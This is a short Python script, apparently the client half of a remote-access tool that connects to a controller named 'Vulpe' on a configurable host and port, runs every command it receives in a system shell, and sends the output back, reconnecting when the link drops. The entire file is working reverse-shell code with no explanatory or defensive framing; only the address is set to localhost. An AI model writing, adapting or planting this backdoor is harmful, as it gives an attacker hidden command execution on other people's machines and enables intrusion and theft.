import os
import socket
import subprocess
from time import sleep

host = '127.0.0.1'
port = 9090

def connection(s):
    while True:
        try:
            data = s.recv(4096)
            if data[:2].decode("utf-8") == 'cd':
                os.chdir(data[3:].decode("utf-8"))
            if len(data) > 0:
                cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                output_bytes = cmd.stdout.read() + cmd.stderr.read()
                output_str = str(output_bytes, "utf-8")
                s.send(str.encode(output_str + str(f"[{os.getcwd()}]$ ")))
            if not data:
                print('[-] Trying to reconnect to Vulpe..')
                try:
                    #s.close
                    setup()
                except socket.error:
                    sleep(10)
        except socket.error:
            pass

    s.close()

def setup():
    s = socket.socket()
    s.connect((host, port))
    s.setblocking(False)
    print("[+] Connected to Vulpe")
    connection(s)

setup()
